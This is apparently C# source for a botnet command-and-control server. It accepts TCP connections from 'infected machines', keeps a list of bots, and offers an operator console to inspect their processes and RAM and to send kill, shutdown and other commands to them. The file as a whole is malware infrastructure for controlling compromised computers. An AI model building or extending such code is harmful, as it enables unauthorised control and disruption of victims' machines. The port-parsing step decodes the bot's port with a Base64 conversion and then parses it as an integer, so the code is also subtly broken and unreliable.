using System;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using CnC_Server;
using CnC_Server.Analyzes;
using CnC_Server.Analyzes.Processes_Analyzes;
using CnC_Server.Analyzes.Ram_Analyzes;
using CnC_Server.Options;
using Common.Attributes;
using Common.Commands;
using Common.Commands.Collector_Commands;
using Common.Commands.Executer_Commands;

namespace Server.CnC_Server
{
    public class Server
    {
        private readonly int ServerPort;
        private TcpListener ServerListener;

        // This list represent the bots that are currently active
        private static List<Infected_Machine> Bots = new List<Infected_Machine>();

        // This dictionary represent all the available analyzes
        private static Dictionary<string, Analysis> Analyzes = new Dictionary<string, Analysis>(StringComparer.CurrentCultureIgnoreCase)
        {
            { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(NumberOfProcessesLowerThen_Analysis)).AnalysisName, new NumberOfProcessesLowerThen_Analysis() },
            { ReflectionExtensions.GetAttribute<AnalysisNameAttribute>(typeof(RamConsumptionLowerThen_Analysis)).AnalysisName, new RamConsumptionLowerThen_Analysis() }
        };

        // This dictionary represent all the available commands
        private static Dictionary<string, Command> Commands = new Dictionary<string, Command>(StringComparer.CurrentCultureIgnoreCase)
        {
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Kill_Command)).CommandName, new Kill_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(ShutDown_Command)).CommandName, new ShutDown_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Processes_Command)).CommandName, new Processes_Command() },
            { ReflectionExtensions.GetAttribute<CommandNameAttribute>(typeof(Ram_Command)).CommandName, new Ram_Command() }
        };

        // This dictionary represent all the available options
        private static Dictionary<string, Option> Options = new Dictionary<string, Option>(StringComparer.CurrentCultureIgnoreCase)
        {
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBots_Option)).OptionName, new PrintBots_Option(Bots) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintCommands_Option)).OptionName, new PrintCommands_Option(Commands) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintAnalyzes_Option)).OptionName, new PrintAnalyzes_Option(Analyzes) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotAnalysis_Option)).OptionName, new PrintBotAnalysis_Option(Bots, Analyzes) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(PrintBotStatus_Option)).OptionName, new PrintBotStatus_Option(Bots) },
            { ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Execute_Option)).OptionName, new Execute_Option(Commands, Bots) }
        };

        public Server(int serverPort)
        {
            this.ServerPort = serverPort;
            this.ServerListener = null;

            // Add the help option (can't be added from dictionary constructor beacuse it requires the dictionary itself)
            Options.Add(ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName, new Help_Option(Options));
        }

        public void Start()
        {
            try
            {
                // Start a new listening task to receive new bots
                Task task = Task.Factory.StartNew(() =>
                {
                    Listen();
                    while (true)
                    {
                        AcceptBot();
                    }
                });

                // Start the CLI menu, receive options from user, parse them and run them
                string CurrentOption = string.Empty;
                Options[ReflectionExtensions.GetAttribute<OptionNameAttribute>(typeof(Help_Option)).OptionName].Run();
                Console.Write("\n>>> ");
                CurrentOption = Console.ReadLine();

                while (!CurrentOption.Equals("exit", StringComparison.CurrentCultureIgnoreCase))
                {
                    parseOption(CurrentOption);
                    Console.Write("\n>>> ");
                    CurrentOption = Console.ReadLine();
                }
            }
            catch(Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// Start a new tcplistener on the server port for new bots
        /// </summary>
        private void Listen()
        {
            try
            {
                this.ServerListener = new TcpListener(IPAddress.Any, ServerPort);

                this.ServerListener.Start();
            }
            catch(Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// Accept a new bot that was connected, receive his listening commands port and add the bot to the bot list
        /// </summary>
        private void AcceptBot()
        {
            try
            {
                Socket clientSocket = this.ServerListener.AcceptSocket();
                
                // Data buffer 
                byte[] bytes = new byte[1024];

                // Receive client port
                int numByte = clientSocket.Receive(bytes);
                string clientPort = Convert.ToBase64String(bytes, 0, numByte);

                // Create new infected machine object with the bot ip and port
                Infected_Machine newBot = new Infected_Machine((clientSocket.RemoteEndPoint as IPEndPoint).Address.ToString(), int.Parse(clientPort));
                
                // Add the new bot to the list of bots
                Bots.Add(newBot);

                clientSocket.Close();
            }
            catch(Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// Receive selected option, parse it and if it's valid then send it to the runOption function
        /// </summary>
        /// <param name="option">The full received option</param>
        private void parseOption(string option)
        {
            // Split the input from user and check that is valid
            string[] splitedOption = option.Split(' ');
            
            if(splitedOption.Length > 0 && splitedOption.Length < 4
                && Options.ContainsKey(splitedOption[0]))
            {
                // Send the input to the runOption method
                runOption(splitedOption[0], splitedOption.Skip(1).ToArray());
                return;
            }

            Console.WriteLine("No matched option was found!");
        }

        private void runOption(string optionName, string[] arguments)
        {
            try
            {
                // Check if the arguments received matched the option arguments
                if (Options[optionName].ParseArguments(arguments))
                {
                    // If everything is valid, run the option selected
                    Options[optionName].Run();
                }
                else
                {
                    Console.WriteLine("Invalid use of the selected option!");
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error while executing selected option.\n{0}", ex.ToString());
            }
        }
    }
}
